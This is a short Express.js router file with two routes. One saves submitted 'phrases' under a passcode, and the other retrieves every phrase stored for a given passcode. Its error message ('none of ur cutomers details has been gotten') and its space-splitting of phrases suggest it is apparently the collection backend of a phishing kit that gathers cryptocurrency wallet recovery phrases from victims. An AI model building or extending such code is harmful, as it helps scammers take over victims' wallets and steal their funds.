const Phrase = require("../model/phrase");

const validatePhrase = require("../validations/validatePhrase");
const validate_passcode = require("../validations/validatePasscode");
const express = require("express");
const Router = express.Router();

Router.post("/", async (req, res) => {
  const isvalid = validatePhrase(req.body);
  if (isvalid != true)
    return res.status(400).json({ error: true, errMessage: isvalid });
  try {
    const phrase = await new Phrase({
      passcode: req.body.passcode,
      phrase: req.body.phrase,
    });
    const result = await phrase.save();
    res.status(200).json({ error: false, message: result });
  } catch (error) {
    res.status(400).json({ error: true, errMessage: error.message });
  }
});

Router.post("/search", async (req, res) => {
  const request_isvalid = validate_passcode(req.body);
  if (request_isvalid != true)
    return res.status(400).json({ error: true, errMessage: request_isvalid });
  try {
    const phrase = await Phrase.find({ passcode: req.body.passcode });
    if (phrase.length < 1)
      return res.status(400).json({
        error: true,
        errMessage:
          "oops no details was found, seems none of ur cutomers details has been gotten",
      });
    // phrase.forEach((phrase) => {
    //   console.log(phrase.phrase.split(" ")[0]);
    // });
    res
      .status(200)
      .json({ error: false, message: phrase, length: phrase.length });
  } catch (error) {
    res.status(400).json({ error: true, errMessage: error.message });
  }
});

module.exports = Router;
